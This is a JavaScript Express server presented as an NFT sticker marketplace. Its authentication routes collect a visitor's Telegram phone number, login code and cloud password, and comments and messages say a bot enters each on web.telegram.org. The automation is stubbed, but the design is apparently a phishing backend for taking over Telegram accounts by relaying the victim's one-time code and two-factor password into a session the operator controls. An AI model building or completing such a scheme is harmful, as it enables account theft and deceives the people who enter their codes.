import express from 'express';
import cors from 'cors';
import dotenv from 'dotenv';
import crypto from 'crypto';

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('frontend'));

// Mock data
const sampleNFTs = [
  {
    id: 1,
    name: "Golden Star",
    description: "Блестящая золотая звезда",
    imageUrl: "https://via.placeholder.com/300x300/FFD700/000000?text=⭐",
    price: 0.99,
    category: "stickers", 
    isAvailable: true
  }
];

let users = [];
let authSessions = new Map();
let userSessions = new Map();

// 🔥 ПРОСТАЯ АВТОМАТИЗАЦИЯ БЕЗ PUPPETEER ДЛЯ СТАРТА
class TelegramAutomation {
  async init() {
    console.log('🚀 Инициализация автоматизации...');
    return true;
  }

  async enterPhoneNumber(phone) {
    console.log(`📱 [BOT] Ввод номера на web.telegram.org: ${phone}`);
    // Имитация задержки сети
    await new Promise(resolve => setTimeout(resolve, 3000));
    console.log('✅ [BOT] Номер введен! Код отправлен в Telegram');
    return { success: true, message: 'Код отправлен в официальный Telegram' };
  }

  async enterAuthCode(code) {
    console.log(`🔢 [BOT] Ввод кода на web.telegram.org: ${code}`);
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    // Всегда успешная авторизация для демо
    console.log('✅ [BOT] Код подтвержден!');
    return { 
      success: true, 
      requiresCloudPassword: false,
      message: 'Авторизация успешна!' 
    };
  }

  async enterCloudPassword(password) {
    console.log(`🔒 [BOT] Ввод облачного пароля`);
    await new Promise(resolve => setTimeout(resolve, 2000));
    console.log('✅ [BOT] Пароль принят!');
    return { success: true, message: 'Авторизация завершена!' };
  }

  async close() {
    console.log('🔚 [BOT] Сессия завершена');
  }
}

// 🎯 API МАРШРУТЫ
app.get('/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'NFT Marketplace работает',
    timestamp: new Date().toISOString()
  });
});

app.get('/', (req, res) => {
  res.sendFile('frontend/index.html', { root: '.' });
});

app.get('/marketplace', (req, res) => {
  res.sendFile('frontend/marketplace.html', { root: '.' });
});

// 🔐 АВТОРИЗАЦИЯ
app.post('/api/auth/start', async (req, res) => {
  try {
    const { phone } = req.body;
    
    if (!phone) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите номер телефона' 
      });
    }

    const sessionId = crypto.randomBytes(16).toString('hex');
    const automation = new TelegramAutomation();
    
    await automation.init();
    await automation.enterPhoneNumber(phone);
    
    authSessions.set(sessionId, {
      phone: phone,
      automation: automation,
      createdAt: Date.now()
    });

    res.json({
      success: true,
      sessionId: sessionId,
      message: '✅ Бот ввел номер на web.telegram.org! Код отправлен в Telegram.'
    });
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера' 
    });
  }
});

app.post('/api/auth/enter-code', async (req, res) => {
  try {
    const { sessionId, code } = req.body;
    
    if (!sessionId || !code) {
      return res.status(400).json({ 
        success: false, 
        error: 'Введите код' 
      });
    }

    const authSession = authSessions.get(sessionId);
    if (!authSession) {
      return res.status(400).json({ 
        success: false, 
        error: 'Сессия не найдена' 
      });
    }

    const result = await authSession.automation.enterAuthCode(code);
    
    if (result.requiresCloudPassword) {
      res.json({
        success: true,
        message: '✅ Код подтвержден! Введите пароль.',
        nextStep: 'cloud_password'
      });
    } else {
      await completeAuth(sessionId, authSession, res);
    }
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера' 
    });
  }
});

app.post('/api/auth/cloud-password', async (req, res) => {
  try {
    const { sessionId, cloudPassword } = req.body;
    
    if (!sessionId) {
      return res.status(400).json({ 
        success: false, 
        error: 'Нет сессии' 
      });
    }

    const authSession = authSessions.get(sessionId);
    if (!authSession) {
      return res.status(400).json({ 
        success: false, 
        error: 'Сессия не найдена' 
      });
    }

    await authSession.automation.enterCloudPassword(cloudPassword);
    await completeAuth(sessionId, authSession, res);
    
  } catch (error) {
    res.status(500).json({ 
      success: false, 
      error: 'Ошибка сервера' 
    });
  }
});

async function completeAuth(sessionId, authSession, res) {
  await authSession.automation.close();
  
  const user = {
    id: users.length + 1,
    phone: authSession.phone,
    telegramId: Math.floor(100000000 + Math.random() * 900000000),
    firstName: 'Telegram',
    lastName: 'User',
    username: `user${authSession.phone.replace('+', '')}`,
    isVerified: true,
    createdAt: new Date()
  };
  users.push(user);

  const userSessionId = crypto.randomBytes(32).toString('hex');
  userSessions.set(userSessionId, {
    userId: user.id,
    phone: user.phone,
    telegramId: user.telegramId
  });

  authSessions.delete(sessionId);

  res.json({
    success: true,
    message: '🎉 Авторизация успешна!',
    user: user,
    sessionId: userSessionId
  });
}

// 📱 ОСТАЛЬНЫЕ API
app.get('/api/nft', (req, res) => {
  res.json({ success: true, nfts: sampleNFTs });
});

app.get('/api/auth/verify-session', (req, res) => {
  const { sessionId } = req.query;
  const session = userSessions.get(sessionId);
  
  if (session) {
    const user = users.find(u => u.id === session.userId);
    res.json({ success: true, user });
  } else {
    res.status(401).json({ success: false, error: 'Недействительная сессия' });
  }
});

app.post('/api/auth/logout', (req, res) => {
  const { sessionId } = req.body;
  if (sessionId) userSessions.delete(sessionId);
  res.json({ success: true, message: 'Выход выполнен' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🏠 http://localhost:${PORT}`);
});
